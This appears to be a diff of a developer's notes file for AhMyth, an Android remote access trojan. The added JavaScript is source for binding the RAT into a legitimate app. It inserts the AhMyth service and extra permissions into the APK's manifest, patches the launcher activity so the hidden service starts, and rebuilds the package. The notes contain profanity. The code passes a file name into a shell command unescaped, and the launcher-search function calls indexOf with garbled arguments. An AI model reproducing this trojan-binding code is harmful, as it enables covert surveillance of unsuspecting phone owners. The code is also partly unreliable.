@@ -167,6 +167,27 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 code utilising `unix "find"` command to find the correct launcher activity | AppCtrl.js | FINALLY FUCKING WORKS!!!!!
 need to implement ShellJS for cross-platform operation of this function now
 ```javascript
+
+            var launcherActivity = GetLauncherActivity(data, apkFolder);
+            if (launcherActivity == -1) {
+                $appCtrl.Log("Cannot find the launcher activity in the Manifest!", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
+                $appCtrl.Log();
+                return;
+            }
+            
+            var ahmythService = CONSTANTS.ahmythService;
+            $appCtrl.Log('Modifying AndroidManifest.xml...');
+            $appCtrl.Log();
+            var permManifest = $appCtrl.copyPermissions(data);
+            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
+            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
+                if (error) {
+                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log();
+                    return;
+                }
+                
                 $appCtrl.Log("Locating Launcher Activity...")
                 $appCtrl.Log();
                 exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
@@ -191,8 +212,86 @@ need to implement ShellJS for cross-platform operation of this function now
                             $appCtrl.Log();
                             return;
                         }
+                        
+                        var startService = CONSTANTS.serviceSrc + launcherPath + CONSTANTS.serviceStart;
+                        
+                        var key = CONSTANTS.orgAppKey;
+                        $appCtrl.Log("Modifiying launcher activity...");
+                        $appCtrl.Log();
+                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+                        fs.writeFile(launcherPath, output, 'utf8', (error) => {
+                            if (error) {
+                                $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
+                                $appCtrl.Log();
+                                return;
+                            }
+
+                            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
+
+                        });
+
 
                     });
+                    
+              });
 
-                });
+        });
+
+    }
+
+|---------------------------------------------|
+function GetLauncherPath(manifest) {
+
+
+    var regex = /<activity/gi,
+        result, indices = [];
+    while ((result = regex.exec(manifest))) {
+        indices.push(result.index);
+    }
+
+    var indexOfLauncher = manifest.indexOf
+   (
+    '"android.intent.action.MAIN"',
+    '"android.intent.category.LAUNCHER"'
+    +
+    '"android.intent.action.MAIN"',
+    '"android.intent.category.INFO"'
+    );
+    var indexOfActivity = -1;
+    
+    if (indexOfLauncher != -1) {
+        manifest = manifest.substring(0, indexOfLauncher);
+        for (var i = indices.length - 1; i >= 0; i--) {
+            if (indices[i] < indexOfLauncher) {
+                indexOfActivity = indices[i];
+                manifest = manifest.substring(indexOfActivity, manifest.length);
+                break;
+            }
+        }
+
+
+        if (indexOfActivity != -1) {
+
+            if (manifest.indexOf('android:targetActivity="') != -1) {
+                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
+                manifest = manifest.substring(0, manifest.indexOf('"'))
+                manifest = manifest.replace(/\./g, "/");
+                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
+                return manifest;
+
+            } else {
+                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
+                manifest = manifest.substring(0, manifest.indexOf('"'))
+                manifest = manifest.replace(/\./g, "/");
+                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
+                return manifest;
+            }
+
+        }
+    }
+    return -1;
+
+
+
+  }
 ``` 
